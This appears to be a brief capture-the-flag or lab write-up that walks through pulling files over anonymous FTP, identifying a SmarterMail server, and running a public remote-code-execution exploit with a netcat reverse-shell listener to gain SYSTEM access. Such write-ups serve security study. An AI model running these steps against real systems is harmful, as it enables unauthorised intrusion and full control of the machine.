# 21

Using `wget -r --user="Anonymous" --password="anonymous" ftp://192.168.182.65/` to get all files
![](attachment/91dece67de3136f9c730944feefd3f57.png)
Now to read all files in log folder:
`cat *`
![](attachment/23ccce20a122ec031b9ad32c0e527833.png)
it is a mail service for sure and searching for the directory structure on google leads us to believe it is SmarterMail![](attachment/2048232694d312380740349fb4a610db.png)

# 17001

Now targeting port 17001 for SmarterMail:
Using this exploit https://packetstormsecurity.com/files/160416/SmarterMail-6985-Remote-Code-Execution.html
Changing the Lhost and Host:
![](attachment/4657335bef0bd3b930c3cc6994236007.png)
```
rlwrap nc -nlvp 8000 
```
```
python3 smartermail.py
```
![](attachment/851042fe1ae15b6e3e608ab0238f3751.png)
![](attachment/7a01382f680f29b2ef24a79ba710c3e8.png)
We are directly nt authority/system
